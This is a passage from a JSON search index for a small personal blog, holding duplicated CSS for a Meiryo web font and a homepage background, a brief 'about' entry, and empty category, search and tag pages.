opera, Safari, Android, iOS 4.2+ */\n    url(\"/fonts/Meiryo.svg#Meiryo\") format(\"svg\");\n    /* iOS 4.1- */\n    font-style: normal;\n    font-weight: normal;\n  }\n  html.page-home {\n    position: absolute;\n    top: 0;\n    left: 0;\n    right: 0;\n    bottom: 0;\n    background-image: url('/images/bg.jpg');\n    background-color: transparent;\n    background-size: cover;\n    background-position: center center;\n    background-repeat: no-repeat;\n  \n    /*background: linear-gradient( #1abc9c, transparent), linear-gradient( 90deg, skyblue, transparent), linear-gradient( -90deg, coral, transparent);*/\n    /*background-blend-mode: screen;*/\n  \n    /*background: linear-gradient(to left, #5f2c82, #49a09d);*/\n  }","categories":[],"tags":[]},{"title":"about","url":"https://pz1o.top/about/index.html","content":"<p>CUMT</p>\n<p></p>\n<p>PWN</p>\n<p>ddl</p>\n","categories":[],"tags":[]},{"title":"","url":"https://pz1o.top/css/personal-style.css","content":"@font-face {\n    font-family: \"Meiryo\";\n    src: url(\"/fonts/Meiryo.eot\");\n    /* IE9 */\n    src: url(\"/fonts/Meiryo.eot?#iefix\") format(\"embedded-opentype\"), /* IE6-IE8 */\n    url(\"/fonts/Meiryo.woff\") format(\"woff\"), /* chrome, firefox */\n    url(\"/fonts/Meiryo.ttf\") format(\"truetype\"), /* chrome, firefox, opera, Safari, Android, iOS 4.2+ */\n    url(\"/fonts/Meiryo.svg#Meiryo\") format(\"svg\");\n    /* iOS 4.1- */\n    font-style: normal;\n    font-weight: normal;\n  }\n  html.page-home {\n    position: absolute;\n    top: 0;\n    left: 0;\n    right: 0;\n    bottom: 0;\n    background-image: url('/images/bg.jpg');\n    background-color: transparent;\n    background-size: cover;\n    background-position: center center;\n    background-repeat: no-repeat;\n  \n    /*background: linear-gradient( #1abc9c, transparent), linear-gradient( 90deg, skyblue, transparent), linear-gradient( -90deg, coral, transparent);*/\n    /*background-blend-mode: screen;*/\n  \n    /*background: linear-gradient(to left, #5f2c82, #49a09d);*/\n\n  }\n}","categories":[],"tags":[]},{"title":"category","url":"https://pz1o.top/category/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"https://pz1o.top/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"https://pz1o.top/tag/index.html","content":"","categories":[],"tags":[]}]